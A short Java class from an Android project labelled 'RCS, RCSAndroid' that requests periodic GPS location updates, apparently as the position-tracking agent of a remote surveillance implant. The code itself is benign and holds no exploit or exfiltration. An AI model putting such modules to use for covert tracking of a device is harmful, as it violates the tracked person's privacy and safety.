/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSAndroid
 * File         : GPSLocatorPeriod.java
 * Created      : 6-mag-2011
 * Author		: zeno
 * *******************************************/

package com.ht.RCSAndroidGUI.agent.position;

import android.location.LocationListener;
import android.location.LocationManager;
import android.os.Looper;

public class GPSLocatorPeriod extends GPSLocator {
	private int period;

	public GPSLocatorPeriod(LocationListener listener, int period) {
		super();
		this.period = period;
		setListener(listener);
	}

	@Override
	public void go(LocationListener listener, LocationManager lm) {
		lm.requestLocationUpdates(LocationManager.GPS_PROVIDER, period, 0L,
				listener, Looper.getMainLooper());
	}

}
